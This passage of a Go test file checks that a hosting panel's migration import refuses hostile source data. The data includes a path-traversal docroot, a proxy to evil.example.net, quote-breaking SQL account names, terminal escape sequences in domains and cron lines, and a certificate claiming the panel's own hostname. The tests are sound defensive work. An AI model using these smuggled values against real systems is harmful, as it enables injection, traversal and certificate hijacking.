		`CREATE TABLE mailboxes (id INTEGER PRIMARY KEY, owner_id INTEGER)`,
	}
	for _, stmt := range append(schema, rows...) {
		if _, err := db.Exec(stmt); err != nil {
			t.Fatalf("%s: %v", stmt, err)
		}
	}
	db.Close()
	raw, err := os.ReadFile(file)
	if err != nil {
		t.Fatal(err)
	}
	return string(raw)
}

// A FASTPANEL source with values the panel refuses: a docroot that climbs out
// of the site, a proxy to another host, a name nginx would split, a system
// schema, a database account name that ends a quoted literal, a cron line
// longer than the panel takes. The plan names them; when the server changes
// its story between the plan and the run, the run leaves them behind.
func TestMigrationFromFastpanelRefusesBadValues(t *testing.T) {
	fakeUnixAccounts(t)
	clean := []string{
		`INSERT INTO panel_account VALUES (7, 'shop', '/var/www/shop/data', 0, 0)`,
		`INSERT INTO site VALUES (11, 'good.example.com', '/var/www/shop/data/www/good.example.com', 1, 1, NULL, 'active', 0, 7)`,
		`INSERT INTO website_backends VALUES (1, 11, 1, 'php_fpm', '84', 'php', '127.0.0.1', 3025)`,
		`INSERT INTO db VALUES (5, 'good_db', 7)`,
		`INSERT INTO database_user VALUES (9, 'shop_u', 7)`,
		`INSERT INTO datbases_users VALUES (1, 9, 5)`,
	}
	poisoned := append(append([]string{}, clean...),
		`INSERT INTO site VALUES (12, 'traversal.example.com', '/var/www/shop/data/www/traversal.example.com/../../../../etc', 0, 1, NULL, 'active', 0, 7)`,
		`INSERT INTO site VALUES (13, 'proxy.example.com', '', 0, 1, NULL, 'active', 0, 7)`,
		`INSERT INTO website_backends VALUES (2, 13, 1, 'nginx', '', 'proxy', 'evil.example.net', 80)`,
		`INSERT INTO site VALUES (14, 'bad name.example.com', '', 0, 1, NULL, 'active', 0, 7)`,
		`INSERT INTO db VALUES (6, 'mysql', 7)`,
		`INSERT INTO db VALUES (8, 'bad`+"`"+`db', 7)`,
		`INSERT INTO database_user VALUES (10, 'x''y', 7)`,
		`INSERT INTO datbases_users VALUES (2, 10, 5)`,
	)
	cleanDB, poisonedDB := buildFastpanelDB(t, clean...), buildFastpanelDB(t, poisoned...)

	remote := newFakeSSH(t)
	remote.files[fastpanelDB] = "binary"
	remote.answers["php -r"] = "8.4"
	remote.answers["getent passwd 'shop'"] = "shop:x:1001:1001::/var/www/shop/data:/usr/sbin/nologin\n"
	remote.answers["getent shadow 'shop'"] = "shop:$y$j9T$shophash:19000::::::\n"
	remote.answers["hostname"] = "fp.example.net\n"
	remote.answers["dpkg-query"] = "2.7.0"
	mysqlAnswers(remote, "777")
	inner := remote.handler
	var mu sync.Mutex
	fetches, poison := 0, false
	remote.handler = func(cmd string) (string, int) {
		switch {
		case strings.HasPrefix(cmd, "python3 -c"):
			mu.Lock()
			defer mu.Unlock()
			// Plan, the run's own plan, then the job: the job gets the poison.
			fetches++
			if poison && fetches >= 3 {
				return poisonedDB, 0
			}
			if poison && fetches == 1 {
				return poisonedDB, 0
			}
			return cleanDB, 0
		case strings.HasPrefix(cmd, "crontab -l -u 'shop'"):
			mu.Lock()
			defer mu.Unlock()
			long := "0 3 * * * php /var/www/shop/data/www/good.example.com/cron.php\n"
			if poison && fetches != 2 {
				long += "* * * * * " + strings.Repeat("a", 1001) + "\n"
			}
			return long, 0
		case strings.HasPrefix(cmd, "tar -C '/var/www/shop/data'"):
			return tarOf(t, map[string]string{"data/www/good.example.com/index.php": "<?php\n"}), 0
		}
		return inner(cmd)
	}

	target := newSiteFixture(t)
	target.installDB()
	body := map[string]any{"panel": "fastpanel", "source": "root@" + remote.addr, "password": remote.password, "scope": "user:shop"}

	// 1: the plan sees the poisoned server.
	mu.Lock()
	poison = true
	mu.Unlock()
	var plan apitypes.MigrationPlan
	target.call(http.MethodPost, "/migrate/plan", body, http.StatusOK, &plan)
	for _, want := range []struct{ kind, target, text string }{
		{"site", "traversal.example.com", "invalid docroot"},
		{"site", "proxy.example.com", "the proxy mode needs a local backend"},
		{"site", "bad name.example.com", "domain: invalid hostname label"},
		{"database", "mysql", "a system schema of MySQL"},
		{"database", "bad`db", "the name must match"},
		{"database", "good_db", "account x'y@localhost: the name must match"},
		{"cron", "", "command must be one line up to 1000 characters"},
	} {
		found := false
		for _, c := range plan.Conflicts {
			if c.Kind == want.kind && (want.target == "" || c.Target == want.target) && strings.Contains(c.Text, want.text) {
				found = true
			}
		}
		if !found {
			t.Errorf("no conflict %s %q %q: %+v", want.kind, want.target, want.text, plan.Conflicts)
		}
	}
	if plan.OK {
		t.Fatal("the poisoned plan must not be OK")
	}

	// 2 and 3: the run's plan sees a clean server, the job the poisoned one.
	var ref struct {
		JobID int64 `json:"job_id"`
	}
	target.call(http.MethodPost, "/migrate/run", body, http.StatusAccepted, &ref)
	job := target.waitJob(ref.JobID)
	if job.Status != store.JobFailed {
		t.Fatalf("the job must end failed: %s %s\n%s", job.Status, job.Error, job.Log)
	}
	for _, line := range []string{"refused: site traversal.example.com", "refused: site proxy.example.com", "refused: database mysql", "refused: database good_db: account x'y@localhost"} {
		if !strings.Contains(job.Log, line) {
			t.Errorf("job log lacks %q:\n%s", line, job.Log)
		}
	}
	if _, err := target.db.GetSiteByDomain(target.ctx, "good.example.com"); err != nil {
		t.Errorf("the clean site did not arrive: %v", err)
	}
	for _, refused := range []string{"traversal.example.com", "proxy.example.com"} {
		if _, err := target.db.GetSiteByDomain(target.ctx, refused); err == nil {
			t.Errorf("refused site %s arrived", refused)
		}
	}
	if dbs, _ := target.db.ListDatabases(target.ctx, 0); len(dbs) != 1 || dbs[0].Name != "good_db" {
		t.Errorf("databases: %+v", dbs)
	}
}

// A BitrixVM server: the names of its sites come from nginx files and
// directory names, the database account from a PHP file of the site — all of
// it text on a server that may have been broken into.
func TestMigrationFromBitrixVMRefusesBadValues(t *testing.T) {
	fakeUnixAccounts(t)
	remote := newFakeSSH(t)
	remote.dirs["/etc/nginx/bx"] = true
	remote.dirs["/home/bitrix"] = true
	remote.dirs["/home/bitrix/www/bitrix"] = true
	remote.files["/etc/nginx/bx/site_enabled/s1.conf"] = "server {\n listen 80 default_server;\n server_name _;\n root /home/bitrix/www;\n}\n"
	remote.files["/etc/nginx/bx/site_enabled/bx_ext_evil.conf"] = "server {\n listen 80;\n root \"/home/bitrix/ext_www/evil site\";\n}\n"
	remote.files["/etc/nginx/bx/site_enabled/bx_ext_quote.conf"] = "server {\n listen 80;\n server_name ev\"il.example.com;\n root /home/bitrix/ext_www/quote;\n}\n"
	remote.files["/home/bitrix/www/bitrix/.settings.php"] = "<?php return array('connections' => array('value' => array('default' => array('host' => 'localhost', 'database' => 'sitemanager', 'login' => 'shop\\'u', 'password' => 'pw'))));\n"
	remote.answers["php -r"] = "8.4"
	remote.answers["getent passwd 'bitrix'"] = "bitrix:x:600:600::/home/bitrix:/sbin/nologin\n"
	remote.answers["getent shadow 'bitrix'"] = "bitrix:$6$salt$bitrixhash:19000::::::\n"
	remote.answers["hostname"] = "vm.bitrix.local\n"
	remote.answers["rpm -q"] = "9.0.8"
	remote.answers["crontab -l -u 'bitrix'"] = "*/5 * * * * php -f /home/bitrix/www/bitrix/modules/main/tools/cron_events.php \x1b[2J\n"
	mysqlAnswers(remote, "2048")

	target := newSiteFixture(t)
	target.installDB()
	body := map[string]any{"panel": "bitrixvm", "source": "root@" + remote.addr, "password": remote.password, "domain": "Main.Example.com."}
	var plan apitypes.MigrationPlan
	target.call(http.MethodPost, "/migrate/plan", body, http.StatusOK, &plan)
	if plan.OK {
		t.Fatal("the plan must not be OK")
	}
	for _, want := range []struct{ kind, target, text string }{
		{"site", "evil site", "is not a fully qualified hostname"},
		{"site", `ev"il.example.com`, "domain: invalid hostname label"},
		{"database", "sitemanager", "account shop'u@localhost: the name must match"},
		{"cron", "", "without control characters"},
	} {
		found := false
		for _, c := range plan.Conflicts {
			if c.Kind == want.kind && (want.target == "" || c.Target == want.target) && strings.Contains(c.Text, want.text) {
				found = true
			}
		}
		if !found {
			t.Errorf("no conflict %s %q %q: %+v", want.kind, want.target, want.text, plan.Conflicts)
		}
	}
	// The main site's name given by a person is taken in the panel's form.
	if len(plan.Bundle.Sites) == 0 || plan.Bundle.Sites[0].Domain != "main.example.com" {
		t.Errorf("main site: %+v", plan.Bundle.Sites)
	}
	var refusal struct {
		Detail string `json:"detail"`
	}
	target.call(http.MethodPost, "/migrate/run", body, http.StatusConflict, &refusal)
	if _, err := target.db.GetUserByLogin(target.ctx, "bitrix"); err == nil {
		t.Error("the account was created")
	}
}

// The panel loads its own certificate from the store by its hostname: a
// source that sends a site and a certificate under that name (with a key it
// knows) must not get its certificate served to the panel's administrators.
func TestMigrationNeverTakesThePanelsOwnName(t *testing.T) {
	fakeUnixAccounts(t)
	f := newFixture(t, func(c *config.Config) { c.Web.Hostname = "panel.example.org" })
	src := newFakeMonoPanel(t)
	clean := evilBundle(t, false, false)
	clean.Databases, clean.MailDomains, clean.Mailboxes, clean.MailAliases, clean.Valkey = nil, nil, nil, nil, nil
	src.plan = clean
	poisoned := evilBundle(t, false, true)
	poisoned.Databases, poisoned.MailDomains, poisoned.Mailboxes, poisoned.MailAliases, poisoned.Valkey = nil, nil, nil, nil, nil
	cert, key := testCert(t, "panel.example.org")
	poisoned.Sites = append(poisoned.Sites, &store.Site{Domain: "panel.example.org", Mode: store.ModeFPM, PHPVersion: "8.4", SSL: "auto"})
	poisoned.Certificates = append(poisoned.Certificates, apitypes.MigrationCert{Name: "panel.example.org", Names: []string{"panel.example.org"}, Kind: store.CertKindCustom, Files: true, Cert: cert, Key: key})
	src.state = poisoned

	// The plan of the poisoned bundle names both.
	planned := *poisoned
	planned.Secrets = nil
	src.mu.Lock()
	src.plan = &planned
	src.mu.Unlock()
	var plan apitypes.MigrationPlan
	f.call(http.MethodPost, "/migrate/plan", src.request(), http.StatusOK, &plan)
	if plan.OK || !issueWith(plan.Conflicts, "site", "panel.example.org", "a hostname of this panel itself") || !issueWith(plan.Conflicts, "cert", "panel.example.org", "a hostname of this panel itself") {
		t.Errorf("plan: %+v", plan.Conflicts)
	}

	// The run of a source that turns between the plan and the job.
	src.mu.Lock()
	src.plan = clean
	src.mu.Unlock()
	var ref struct {
		JobID int64 `json:"job_id"`
	}
	f.call(http.MethodPost, "/migrate/run", src.request(), http.StatusAccepted, &ref)
	if job := f.waitJob(ref.JobID); job.Status != store.JobFailed || !strings.Contains(job.Log, "refused: cert panel.example.org") {
		t.Errorf("job: %s %s\n%s", job.Status, job.Error, job.Log)
	}
	if _, err := os.Stat(filepath.Join(f.s.cfg.DataDir, "certs", "panel.example.org", "privkey.pem")); err == nil {
		t.Error("the source's key landed where the panel loads its own certificate from")
	}
	if _, err := f.db.GetSiteByDomain(f.ctx, "panel.example.org"); err == nil {
		t.Error("a site under the panel's hostname arrived")
	}
	if _, err := f.db.GetCertificateByName(f.ctx, "good.example.org"); err != nil {
		t.Errorf("the clean certificate did not arrive: %v", err)
	}
}

// The plan hands the source's values to people: mp migrate plan prints the
// sites, cron lines and login of the bundle in a terminal, refused ones too.
// No control character of the source gets there, nor into the 409 of
// migrate-run; a tab in a command stays, and so do the lines of a note.
func TestMigrationPlanShowsNoControlCharacters(t *testing.T) {
	f := newMigrationTarget(t)
	src := newFakeMonoPanel(t)
	b := evilBundle(t, false, false)
	b.Sites = append([]*store.Site{
		{Domain: "esc\x1b]0;owned\x07.example.org", Mode: store.ModeFPM, PHPVersion: "8.4"},
		// The alias is quoted as it is by the sites-create rule's own error.
		{Domain: "alias-esc.example.org", Mode: store.ModeFPM, PHPVersion: "8.4", Aliases: []string{"x\x1b[2J.example.org"}},
	}, b.Sites...)
	b.Cron = append(b.Cron, &store.CronJob{Schedule: "@daily", Command: "printf 'a\tb' \x1b[31m", Comment: "\u009b31m", Enabled: true})
	b.Notes = append(b.Notes, "two\nlines")
	src.plan = b

	var raw json.RawMessage
	f.call(http.MethodPost, "/migrate/plan", src.request(), http.StatusOK, &raw)
	for _, bad := range []string{`\u001b`, `\u0007`, "\u009b"} {
		if strings.Contains(string(raw), bad) {
			t.Errorf("%q reached the plan: %s", bad, raw)
		}
	}
	var plan apitypes.MigrationPlan
	if err := json.Unmarshal(raw, &plan); err != nil {
		t.Fatal(err)
	}
	if plan.OK || !issueWith(plan.Conflicts, "site", "esc]0;owned.example.org", "domain: invalid hostname label") || !issueWith(plan.Conflicts, "site", "alias-esc.example.org", "alias x[2j.example.org: invalid hostname label") {
		t.Errorf("the sites with escapes: %+v", plan.Conflicts)
	}
	var cron *store.CronJob
	for _, j := range plan.Bundle.Cron {
		if strings.HasPrefix(j.Command, "printf") {
			cron = j
		}
	}
	if cron == nil || cron.Command != "printf 'a\tb' [31m" || cron.Comment != "31m" {
		t.Errorf("cron as the plan shows it: %+v", cron)
	}
	if notes := strings.Join(plan.Bundle.Notes, "|"); !strings.Contains(notes, "two\nlines") {
		t.Errorf("notes: %q", notes)
	}

	var refusal struct {
		Detail string `json:"detail"`
	}
	f.call(http.MethodPost, "/migrate/run", src.request(), http.StatusConflict, &refusal)
	if strings.ContainsAny(refusal.Detail, "\x1b\x07") || !strings.Contains(refusal.Detail, "esc]0;owned.example.org") {
		t.Errorf("409: %q", refusal.Detail)
	}
}

// A source decides how long its answer is: past the limit the plan stops
// with the reason instead of reading on into this panel's memory.
func TestMigrationBundleSizeLimit(t *testing.T) {
	f := newMigrationTarget(t)
	was := maxBundleBytes
	maxBundleBytes = 1 << 20
	t.Cleanup(func() { maxBundleBytes = was })
	src := newFakeMonoPanel(t)
	b := evilBundle(t, false, false)
	b.Notes = append(b.Notes, strings.Repeat("x", 2<<20))
	src.plan = b
	var refusal struct {
		Detail string `json:"detail"`
	}
	f.call(http.MethodPost, "/migrate/plan", src.request(), http.StatusBadGateway, &refusal)
	if !strings.Contains(refusal.Detail, "the source's answer is larger than 1 MB") {
		t.Errorf("plan: %q", refusal.Detail)
	}
	b.Notes = b.Notes[:len(b.Notes)-1]
	var plan apitypes.MigrationPlan
	f.call(http.MethodPost, "/migrate/plan", src.request(), http.StatusOK, &plan)
}

// testCertOrg makes a self-signed certificate whose issuer names the
// organization: all it takes for a certificate to look like Let's Encrypt's.
func testCertOrg(t *testing.T, org string, names ...string) (cert, key string) {
	t.Helper()
	priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	subject := pkix.Name{CommonName: names[0]}
	if org != "" {
		subject.Organization = []string{org}
	}
	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(time.Now().UnixNano()), Subject: subject, DNSNames: names,
		NotBefore: time.Now().Add(-time.Hour), NotAfter: time.Now().Add(365 * 24 * time.Hour),
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &priv.PublicKey, priv)
	if err != nil {
		t.Fatal(err)
	}
	k, err := x509.MarshalECPrivateKey(priv)
	if err != nil {
		t.Fatal(err)
	}
	return string(pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})), string(pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: k}))
}

// The run checks the bundle when it starts, and the files take hours to
// copy. Another account may add a site or a database of a name the bundle
// brings meanwhile: the import must not hand it the source's certificate
// (sites take theirs by name) or grant the source's accounts on its
// database. And an ACME certificate keeps in its record — what a renewal
// orders and which sites it is attached to — only the account's own sites:
// the issuer that makes it ACME is a string of the source's choosing.
func TestMigrationRunRechecksWhatAppearedMeanwhile(t *testing.T) {
	f := newMigrationTarget(t)
	alex, err := f.db.GetUserByLogin(f.ctx, "alex")
	if err != nil {
		t.Fatal(err)
	}
	src := newFakeMonoPanel(t)
	src.plan = evilBundle(t, false, false)
	state := evilBundle(t, false, true)
	leCert, leKey := testCertOrg(t, "Let's Encrypt", "good.example.org", "www.good.example.org", "later.example.org")
	shopCert, shopKey := testCertOrg(t, "", "shop.example.org")
	state.Certificates = []apitypes.MigrationCert{
		{Name: "good.example.org", Names: []string{"good.example.org"}, Kind: store.CertKindACME, AutoRenew: true, Files: true, Cert: leCert, Key: leKey},
		{Name: "shop.example.org", Names: []string{"shop.example.org"}, Kind: store.CertKindCustom, Files: true, Cert: shopCert, Key: shopKey},
	}
	src.state = state
	src.onFiles = func() {
		if err := f.db.CreateSite(f.ctx, &store.Site{UserID: alex.ID, Domain: "shop.example.org", Mode: store.ModeFPM, PHPVersion: "8.4", SSL: "auto"}); err != nil {
			t.Error(err)
		}
		if err := f.db.CreateDatabase(f.ctx, &store.Database{UserID: alex.ID, Name: "evil_db"}); err != nil {
			t.Error(err)
		}
	}
	var mysqlSQL []string
	var mu sync.Mutex
	f.agent.ToolHook = func(req agent.ToolRequest) *agent.ToolResponse {
		if req.Name == "mysql" {
			mu.Lock()
			mysqlSQL = append(mysqlSQL, req.Stdin)
			mu.Unlock()
		}
		return nil
	}

	var ref struct {
		JobID int64 `json:"job_id"`
	}
	f.call(http.MethodPost, "/migrate/run", src.request(), http.StatusAccepted, &ref)
	job := f.waitJob(ref.JobID)
	if job.Status != store.JobFailed {
		t.Fatalf("the job must end failed: %s %s\n%s", job.Status, job.Error, job.Log)
	}
	for _, line := range []string{
		"database evil_db: the panel has a database of this name now",
		"site shop.example.org: ",
		"certificate shop.example.org: no site of the account has this name here",
	} {
		if !strings.Contains(job.Log, line) {
			t.Errorf("job log lacks %q:\n%s", line, job.Log)
		}
	}

	// The other account's site has no certificate of the source.
	if _, err := f.db.GetCertificateByName(f.ctx, "shop.example.org"); err == nil {
		t.Error("the source's certificate was recorded for another account's site")
	}
	if _, err := os.Stat(filepath.Join(f.s.cfg.DataDir, "certs", "shop.example.org", "privkey.pem")); err == nil {
		t.Error("the source's key landed where the other account's site takes its certificate from")
	}
	if site, err := f.db.GetSiteByDomain(f.ctx, "shop.example.org"); err != nil || site.UserID != alex.ID {
		t.Errorf("the other account's site: %+v %v", site, err)
	}
	// Nor accounts of the source on its database.
	mu.Lock()
	all := strings.Join(mysqlSQL, "\n")
	mu.Unlock()
	for _, never := range []string{"ON `evil\\_db`", "CREATE USER 'evil_u'", "CREATE USER 'evil_ro'"} {
		if strings.Contains(all, never) {
			t.Errorf("mysql ran %q:\n%s", never, all)
		}
	}
	if db, err := f.db.GetDatabaseByName(f.ctx, "evil_db"); err != nil || db.UserID != alex.ID || len(db.Users) != 0 {
		t.Errorf("the other account's database: %+v %v", db, err)
	}

	// The account's own certificate arrived; as ACME it names its sites only.
	u, err := f.db.GetUserByLogin(f.ctx, "evil")
	if err != nil {
		t.Fatal(err)
	}
	c, err := f.db.GetCertificateByName(f.ctx, "good.example.org")
	if err != nil || c.UserID == nil || *c.UserID != u.ID || c.Kind != store.CertKindACME || strings.Join(c.Names, ",") != "good.example.org,www.good.example.org" {
		t.Errorf("good certificate: %+v %v", c, err)
	}
}

// A send-only domain arrives send-only: another server receives its mail, so
// it brings no Maildir, no mailboxes and no aliases, and cannot be lenient —
// the rules of mail-domains-create. Without the flag this server would take
// the domain's mail for itself and bounce what its sites send there.
func TestMigrationKeepsSendOnlyDomains(t *testing.T) {
	f := newMigrationTarget(t)
	src := newFakeMonoPanel(t)
	sendOnly := func(b *apitypes.MigrationBundle) *apitypes.MigrationBundle {
		b.MailDomains = append(b.MailDomains, &store.MailDomain{ID: 8, Name: "send.example.org", Active: true, SendOnly: true})
		return b
	}
	bad := sendOnly(evilBundle(t, false, false))
	bad.MailDomains = append(bad.MailDomains, &store.MailDomain{ID: 9, Name: "lenient.example.org", Active: true, SendOnly: true, Lenient: true})
	bad.Mailboxes = append(bad.Mailboxes, &store.Mailbox{DomainID: 8, LocalPart: "box", Address: "box@send.example.org", Active: true})
	bad.MailAliases = append(bad.MailAliases, &store.MailAlias{DomainID: 8, Source: "alias", Address: "alias@send.example.org", Destination: "info@evil.example.org", Active: true})
	src.plan = bad
	var plan apitypes.MigrationPlan
	f.call(http.MethodPost, "/migrate/plan", src.request(), http.StatusOK, &plan)
	for _, want := range []struct{ target, text string }{
		{"lenient.example.org", "a send-only domain receives no mail here, so it cannot be lenient"},
		{"box@send.example.org", "the domain is send-only"},
		{"alias@send.example.org", "the domain is send-only"},
	} {
		if !issueWith(plan.Conflicts, "mail", want.target, want.text) {
			t.Errorf("no conflict for %s: %+v", want.target, plan.Conflicts)
		}
	}

	src.plan, src.state = sendOnly(evilBundle(t, false, false)), sendOnly(evilBundle(t, false, true))
	var ref struct {
		JobID int64 `json:"job_id"`
	}
	f.call(http.MethodPost, "/migrate/run", src.request(), http.StatusAccepted, &ref)
	if job := f.waitJob(ref.JobID); job.Status != store.JobDone {
		t.Fatalf("job: %s %s\n%s", job.Status, job.Error, job.Log)
	}
	if d, err := f.db.GetMailDomain(f.ctx, "send.example.org"); err != nil || !d.SendOnly {
		t.Errorf("send-only domain: %+v %v", d, err)
	}
	src.mu.Lock()
	asked := strings.Join(src.files, " ")
	src.mu.Unlock()
	if !strings.Contains(asked, "mail:evil.example.org") || strings.Contains(asked, "mail:send.example.org") {
		t.Errorf("Maildirs asked for: %s", asked)
	}
}

// A database whose accounts stay behind (here: one for a remote host) keeps
// the account of the panel's making it was loaded as: its views and triggers
// name it, and without one the database could not be used or managed. Its
// record carries a real plugin, so mp db passwd works on it.
func TestMigrationDatabaseWithoutAccountsGetsOne(t *testing.T) {
	f := newMigrationTarget(t)
	src := newFakeMonoPanel(t)
	bundle := func(secrets bool) *apitypes.MigrationBundle {
		b := evilBundle(t, false, secrets)
		b.Databases = []*store.Database{{Name: "evil_noacc", Charset: "utf8mb4", Collation: "utf8mb4_0900_ai_ci", Users: []*store.DBUser{{Name: "evil_x", Host: "%"}}}}
		return b
	}
	src.plan, src.state = bundle(false), bundle(true)
	src.dump = "CREATE TABLE t (id int);\n/*!50003 CREATE*/ /*!50017 DEFINER=`root`@`localhost`*/ /*!50003 TRIGGER tr BEFORE INSERT ON t FOR EACH ROW SET @x = 1 */;;\n"
	var mysqlSQL []string
	var mu sync.Mutex
	f.agent.ToolHook = func(req agent.ToolRequest) *agent.ToolResponse {
		if req.Name == "mysql" {
			mu.Lock()
			mysqlSQL = append(mysqlSQL, req.Stdin)
			mu.Unlock()
		}
		return nil
	}
	var ref struct {
		JobID int64 `json:"job_id"`
	}
	f.call(http.MethodPost, "/migrate/run", src.request(), http.StatusAccepted, &ref)
	job := f.waitJob(ref.JobID)
	if job.Status != store.JobDone || !strings.Contains(job.Log, "database evil_noacc came without an account of its own here: the account mpimp_") {
		t.Fatalf("job: %s %s\n%s", job.Status, job.Error, job.Log)
	}
	db, err := f.db.GetDatabaseByName(f.ctx, "evil_noacc")
	if err != nil || len(db.Users) != 1 || !strings.HasPrefix(db.Users[0].Name, importAccountPrefix) || db.Users[0].AuthPlugin != "caching_sha2_password" {
		t.Fatalf("database: %+v %v", db, err)
	}
	account := db.Users[0].Name
	mu.Lock()
	all := strings.Join(mysqlSQL, "\n")
	mu.Unlock()
	for _, want := range []string{
		"CREATE USER '" + account + "'@'localhost' IDENTIFIED WITH auth_socket AS 'root';\nGRANT ALL PRIVILEGES ON `evil\\_noacc`.* TO '" + account + "'@'localhost';",
		"ALTER USER '" + account + "'@'localhost' IDENTIFIED WITH caching_sha2_password BY '",
	} {
		if !strings.Contains(all, want) {
			t.Errorf("mysql lacks %q:\n%s", want, all)
		}
	}
	if strings.Contains(all, "evil_x") || strings.Contains(all, "DROP USER") || strings.Contains(all, "ACCOUNT LOCK") {
		t.Errorf("mysql:\n%s", all)
	}
	for _, st := range f.agent.Streams() {
		if st.Direction == "in" && st.Name == "mysql" && strings.Join(st.Args, " ") != "--protocol=socket --binary-mode --local-infile=0 --user="+account+" evil_noacc" {
			t.Errorf("dump loaded with %v", st.Args)
		}
	}

	// mp db passwd: a password for the account, not an error on it.
	var out apitypes.DatabaseResponse
	f.call(http.MethodPost, "/databases/evil_noacc/password", map[string]any{}, http.StatusOK, &out)
	mu.Lock()
	all = strings.Join(mysqlSQL, "\n")
	mu.Unlock()
	if out.Password == "" || !strings.Contains(all, "ALTER USER '"+account+"'@'localhost' IDENTIFIED WITH caching_sha2_password BY '") {
		t.Errorf("password reset: %+v\n%s", out, all)
	}
}
